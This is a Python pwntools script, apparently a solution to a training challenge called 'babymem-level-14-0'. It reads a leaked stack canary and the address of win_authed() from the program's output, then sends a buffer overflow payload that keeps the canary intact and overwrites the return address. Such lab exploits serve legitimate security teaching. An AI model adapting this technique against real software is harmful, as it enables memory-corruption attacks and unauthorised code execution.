from pwn import *

def hack():
	init_payload = b"REPEAT"

	p = process("./babymem-level-14-0")

	print(p.recvuntil(b"Payload size: "))

	p.sendline(b"400")

	print(p.recvuntil(b"Send your payload (up to 400 bytes)!"))

	p.sendline(init_payload)

	leak = p.recvuntil(b"Payload size: ")
	print("\n\nLEAK :::\n\n")
	print(leak)

	#exit(0)
	win_authed = leak.split(b'- the address of win_authed() is')[1].split(b'\n')[0].split(b'.')[0].split(b' ')[1]
	canary = leak.split(b'- the canary value is now')[1].split(b'\n')[0].split(b'.')[0].split(b' ')[1]
	
	print("\n\n[+] win_authed ::", win_authed)
	print("\n\n[+] LEAK ::", canary)

	#canary = bytes.fromhex(canary.decode().split("0x")[1]) # big-endian (X)
	win_authed = p64(int(win_authed, 16) + 0x1c)
	canary = p64(int(canary, 16))

	payload = b""
	payload += b"A" * 328
	payload += canary
	payload += b"A" * 8
	payload += win_authed

	p.sendline(b"400")

	print(p.recv(22000))

	p.sendline(payload)
	
	p.interactive()

	p.close()
	p.kill()

hack()
